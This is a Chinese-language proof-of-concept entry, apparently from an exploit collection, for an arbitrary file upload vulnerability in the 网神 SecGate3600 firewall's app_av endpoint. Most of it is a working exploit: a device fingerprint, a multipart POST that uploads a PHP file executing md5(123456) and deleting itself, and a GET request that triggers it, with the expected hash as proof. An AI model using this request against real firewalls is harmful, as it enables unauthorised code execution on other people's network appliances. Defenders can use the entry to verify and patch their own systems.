# 网神SecGate3600防火墙app_av存在任意文件上传漏洞

- **系统**：网神SecGate3600防火墙　|　**类型**：文件上传　|　**CVE**：—
- **指纹**：`"1Lh1LHi6yfkhiO83I59AYg=="`
- **请求**：`POST /?g=app_av HTTP/1.1`
- **关键头**：`Priority: u=1, i`　`Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryJpMyThWn…`　`Cookie: __s_sessionid__=2uar1u9dlf00tthitsfvm716j2; __s_sessionid__=2uar1u9dlf00tthitsfv…`　`Content-Length: 471`

**请求体 / payload**
```
------WebKitFormBoundaryJpMyThWnAxbcBBQc
Content-Disposition: form-data; name="reqfile";filename="2uar1u9dlf00tthitsfvm716j3.php"
Content-Type: text/plain
<?php echo(md5(123456));unlink(__FILE__);?>
------WebKitFormBoundaryJpMyThWnAxbcBBQc
Content-Disposition: form-data; name="submit_post"
app_av_import_save
------WebKitFormBoundaryJpMyThWnAxbcBBQc
Content-Disposition: form-data; name="certfile_r"
file
------WebKitFormBoundaryJpMyThWnAxbcBBQc--
GET /attachements/2uar1u9dlf00tthitsfvm716j3.php HTTP/1.1
Host:
Cookie: __s_sessionid__=2uar1u9dlf00tthitsfvm716j2;; __s_sessionid__=2uar1u9dlf00tthits…（脚本共 625 字，完整版见原文）
```
- **预期**：302　|　e10adc3949ba59abbe56e057f20f883e